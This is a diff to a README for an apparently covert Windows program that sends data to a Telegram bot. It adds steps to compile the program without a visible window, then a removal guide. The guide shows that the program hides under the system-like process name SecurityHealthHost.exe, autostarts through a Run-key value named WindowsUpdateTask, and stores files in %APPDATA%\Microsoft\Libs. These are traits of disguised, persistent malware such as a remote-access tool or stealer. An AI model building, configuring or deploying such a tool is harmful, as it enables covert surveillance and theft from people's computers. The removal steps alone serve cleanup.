@@ -48,3 +48,14 @@ In the `main.cpp` file, replace the following values ​​with your own:
 ```cpp
 std::string token = "YOUR_TELEGRAM_TOKEN";
 std::string chatId = "YOUR_CHAT_ID";
+```
+
+## Compilation
+1. Set the configuration mode to Release
+2. In the project properties: Linker -> System -> SubSystem set Windows (/SUBSYSTEM:WINDOWS)
+3. Assemble the project
+
+## Complete removal from the system
+1. Terminate the SecurityHealthHost.exe process in Task Manager
+2. Delete the WindowsUpdateTask value from HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+3. Delete the folder %APPDATA%\Microsoft\Libs 
